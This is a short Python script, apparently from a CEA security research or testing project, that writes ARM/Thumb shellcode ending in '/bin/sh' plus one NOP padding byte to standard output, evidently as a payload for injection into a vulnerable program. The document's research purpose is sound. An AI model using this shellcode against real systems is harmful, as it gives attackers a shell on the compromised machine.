# Copyright (C) 2025 CEA - All Rights Reserved
# 
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
# 
# This program is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along with
# this program.  If not, see <http://www.gnu.org/licenses/>.

import sys 
padding=b"\x90"
shellcode_hex=b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\xcb\x27\x40\x40\x49\x40\x01\xdf\x0b\x27\x52\x40\x02\x92\x01\x92\x02\xa0\xc2\x71\x01\x90\x69\x46\x04\x31\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78'
sys.stdout.buffer.write(shellcode_hex + padding)

